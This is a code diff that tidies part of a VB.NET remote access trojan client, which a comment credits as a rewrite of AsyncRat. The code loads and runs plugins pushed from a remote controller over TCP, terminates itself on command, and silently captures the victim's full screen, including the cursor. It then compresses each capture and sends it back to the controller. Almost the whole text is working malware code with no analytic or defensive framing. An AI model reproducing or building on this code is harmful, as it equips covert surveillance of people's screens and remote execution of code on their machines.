@@ -126,15 +126,10 @@ Public Class C
 
 
                 Case PacketType.PLUGIN
-                    ' SyncLock T.GetStream
-                    '   Dim S As New Thread(Sub() Launch(T, packet.Plugin, packet.Function_Params))
-                    '  S.Start()
+
                     Await Task.Run(Sub() Launch(T, packet.Plugin, packet.Function_Params))
-                  '  End SyncLock
-                    '  Launch(T, packet.Plugin, packet.Function_Params)
-                   ' Launch(T, packet.Plugin, packet.Function_Params)
-               '     Threading.ThreadPool.QueueUserWorkItem(Sub() )
-                        Case PacketType.MSG
+
+                Case PacketType.MSG
 
                     NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)
 
@@ -142,9 +137,7 @@ Public Class C
 
 
                     Dim O As Object() = packet.Function_Params
-                    '
-                    '    Threading.ThreadPool.QueueUserWorkItem(Sub())
-                    '  Capture(O(0), O(1), O(2), O(3))
+
 
                     Await Task.Run(Sub() Capture(O(0), O(1), O(2), O(3)))
             End Select
@@ -152,10 +145,6 @@ Public Class C
         End While
 
     End Sub
-
-    '  Public Shared Async Sub Launch(ByVal k As TcpClient, ByVal B As Byte(), ByVal P As Object())
-
-
 
     <DllImport("kernel32.dll", SetLastError:=True)>
     Public Shared Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
@@ -244,70 +233,67 @@ Public Class C
     End Sub
     ''Comes from AsyncRat VBNET rewritten by Arsium
     Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer, ByVal Q As Integer, ByVal F As String)
-        '    SyncLock T
 
-        '       Await Task.Run(Sub()
 
 
         Try
-                               '  Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
 
-                               Dim iamage As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
+            Dim iamage As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
 
-                               Dim graphics As Graphics = Graphics.FromImage(iamage)
+            Dim graphics As Graphics = Graphics.FromImage(iamage)
 
-                               graphics.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed
-
-
-                               graphics.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
-
-                               Dim P As New Point
-
-                               GetCursorPos(P)
-
-                               Dim CS As New CURSORINFOHELPER
-
-                               CS.cbSize = Marshal.SizeOf(CS)
-
-                               GetCursorInfo(CS)
-
-                               If CS.flags = &H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message
-                                   '
-                                   graphics.DrawIcon(Icon.FromHandle(CS.hCursor), P.X, P.Y)
-
-                               End If
-
-                               Dim Resize As New Bitmap(W, H)
-                               Dim g2 As Graphics = Graphics.FromImage(Resize)
-                               g2.CompositingQuality = CompositingQuality.HighSpeed
-                               g2.DrawImage(iamage, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
-
-                               Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, Q)
-                               Dim encoderInfo As ImageCodecInfo
-
-                               If F = "PNG" Then
-
-                                   encoderInfo = GetEncoderInfo(ImageFormat.Png)
-
-                               ElseIf F = "JPEG" Then
-
-                                   encoderInfo = GetEncoderInfo(ImageFormat.Jpeg)
-
-                               ElseIf F = "GIF" Then
-
-                                   encoderInfo = GetEncoderInfo(ImageFormat.Gif)
-
-                               End If
+            graphics.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed
 
 
+            graphics.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
 
-                               Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
-                               encoderParameters.Param(0) = encoderParameter
+            Dim P As New Point
 
-                               Dim MS As New IO.MemoryStream
-                               Resize.Save(MS, encoderInfo, encoderParameters)
+            GetCursorPos(P)
 
-                               Try
+            Dim CS As New CURSORINFOHELPER
+
+            CS.cbSize = Marshal.SizeOf(CS)
+
+            GetCursorInfo(CS)
+
+            If CS.flags = &H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message
+                '
+                graphics.DrawIcon(Icon.FromHandle(CS.hCursor), P.X, P.Y)
+
+            End If
+
+            Dim Resize As New Bitmap(W, H)
+            Dim g2 As Graphics = Graphics.FromImage(Resize)
+            g2.CompositingQuality = CompositingQuality.HighSpeed
+            g2.DrawImage(iamage, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
+
+            Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, Q)
+            Dim encoderInfo As ImageCodecInfo
+
+            If F = "PNG" Then
+
+                encoderInfo = GetEncoderInfo(ImageFormat.Png)
+
+            ElseIf F = "JPEG" Then
+
+                encoderInfo = GetEncoderInfo(ImageFormat.Jpeg)
+
+            ElseIf F = "GIF" Then
+
+                encoderInfo = GetEncoderInfo(ImageFormat.Gif)
+
+            End If
+
+
+
+            Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
+            encoderParameters.Param(0) = encoderParameter
+
+            Dim MS As New IO.MemoryStream
+            Resize.Save(MS, encoderInfo, encoderParameters)
+
+            Try
                 SyncLock T
 
                     Dim packet As New PacketMaker With {
@@ -323,23 +309,22 @@ Public Class C
                 End SyncLock
             Catch ex As Exception
 
-                               End Try
+            End Try
 
-                               Try
-                                   graphics.Dispose()
-                                   g2.Dispose()
-                                   iamage.Dispose()
-                                   Resize.Dispose()
-                                   MS.Dispose()
-                                   encoderParameter.Dispose()
-                                   encoderParameters.Dispose()
-                               Catch ex As Exception
-                               End Try
+            Try
+                graphics.Dispose()
+                g2.Dispose()
+                iamage.Dispose()
+                Resize.Dispose()
+                MS.Dispose()
+                encoderParameter.Dispose()
+                encoderParameters.Dispose()
+            Catch ex As Exception
+            End Try
 
-                           Catch ex As Exception
-                           End Try
-        ' End SyncLock
-        '       End Sub)
+        Catch ex As Exception
+        End Try
+
     End Sub
 
 
